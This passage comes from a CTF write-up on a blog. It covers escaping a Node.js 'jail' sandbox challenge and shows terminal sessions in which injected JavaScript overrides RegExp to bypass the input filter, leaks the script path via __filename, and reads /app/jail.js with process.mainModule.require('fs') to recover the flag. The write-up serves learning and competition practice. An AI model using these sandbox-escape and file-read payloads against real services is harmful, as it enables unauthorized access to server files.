<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _&apos;_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|</div><div class="line">| &quot;You get one call, UNO.&quot;  |</div><div class="line"> &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</div><div class="line">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</div><div class="line">Invalid number</div><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _&apos;_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|</div><div class="line">| &quot;You get one call, UNO.&quot;  |</div><div class="line"> &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line"> Phone #&gt; __filename</div><div class="line">Calling /app/jail.js... Nobody picks up!</div></pre></td></tr></table></figure>
<p>We have the full path! the javascript file is located in /app/jail.js </p>
<h3 id="Read-the-javascript-file"><a href="#Read-the-javascript-file" class="headerlink" title="Read the javascript file"></a>Read the javascript file</h3><p>Finally by injecting this after the override <code> process.mainModule.require(‘fs’).readFileSync(‘/app/jail.js’).toString()</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</span></div><div class="line"><span class="string">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</span></div><div class="line"><span class="string">Invalid number</span></div><div class="line"><span class="string">_____________________________</span></div><div class="line"><span class="string">     ||   ||     ||   ||</span></div><div class="line"><span class="string">     ||   ||, , ,||   ||</span></div><div class="line"><span class="string">     ||  (||/|/(/||/  ||</span></div><div class="line"><span class="string">     ||  ||| _'</span>_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"|</span></div><div class="line"><span class="string">| "</span>You get one call, UNO.<span class="string">"  |</span></div><div class="line"><span class="string"> "</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div><div class="line"> Phone <span class="comment">#&gt; process.mainModule.require('fs').readFileSync('/app/jail.js').toString()</span></div><div class="line">Calling var flag = <span class="string">"SECT&#123;1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,&#125;"</span></div><div class="line">var readline = require(<span class="string">'readline'</span>);</div><div class="line">var rl = readline.createInterface(process.stdin, process.stdout);</div></pre></td></tr></table></figure>
<p>Finally our flag is SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Jail - Pwn (200 + 0)&lt;br&gt;&lt;br&gt;Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="sandbox" scheme="https://teamrocketist.github.io/tags/sandbox/"/>
    
      <category term="jailescape" scheme="https://teamrocketist.github.io/tags/jailescape/"/>
    
      <category term="javascript" scheme="https://teamrocketist.github.io/tags/javascript/"/>
    
      <category term="nodejs" scheme="https://teamrocketist.github.io/tags/nodejs/"/>
    
  </entry>
  
</feed>
